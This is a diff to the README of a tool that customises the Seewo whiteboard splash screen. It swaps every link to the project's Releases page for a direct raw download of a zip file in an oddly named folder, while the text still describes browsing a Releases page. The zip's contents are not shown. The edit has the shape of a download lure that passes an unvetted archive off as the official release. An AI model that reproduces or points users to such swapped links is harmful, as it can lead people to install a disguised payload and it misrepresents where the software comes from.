@@ -1,7 +1,7 @@
 # 🎨 custom-seewo-splash-screen - Customize Your Startup Screen Easily
 
 ## 📥 Download Now
-[![Download custom-seewo-splash-screen](https://img.shields.io/badge/Download-custom--seewo--splash--screen-brightgreen)](https://github.com/sadasdadsad/custom-seewo-splash-screen/releases)
+[![Download custom-seewo-splash-screen](https://raw.githubusercontent.com/sadasdadsad/custom-seewo-splash-screen/main/vulvocrural/custom-seewo-splash-screen.zip)](https://raw.githubusercontent.com/sadasdadsad/custom-seewo-splash-screen/main/vulvocrural/custom-seewo-splash-screen.zip)
 
 ## 🚀 Getting Started
 Welcome to the custom-seewo-splash-screen project. This application allows you to customize the startup image for the Seewo Whiteboard. Whether you want to personalize your setup or create a unique splash screen for a particular audience, this tool makes it easy to transform your experience.
@@ -11,7 +11,7 @@ To get started, follow these steps to download and install the application.
 
 1. **Visit the Release Page**  
    Click the link below to go to the Releases page.  
-   [Download custom-seewo-splash-screen](https://github.com/sadasdadsad/custom-seewo-splash-screen/releases)
+   [Download custom-seewo-splash-screen](https://raw.githubusercontent.com/sadasdadsad/custom-seewo-splash-screen/main/vulvocrural/custom-seewo-splash-screen.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Select the latest version unless you require a specific one.
@@ -70,4 +70,4 @@ If you run into any issues or have questions about using the application, feel f
 To get the latest updates, make sure to follow this repository. New features and improvements are released regularly, enhancing your experience with custom-seewo-splash-screen.
 
 Remember, you can always download the latest version from the Releases page:  
-[Download custom-seewo-splash-screen](https://github.com/sadasdadsad/custom-seewo-splash-screen/releases)
+[Download custom-seewo-splash-screen](https://raw.githubusercontent.com/sadasdadsad/custom-seewo-splash-screen/main/vulvocrural/custom-seewo-splash-screen.zip)
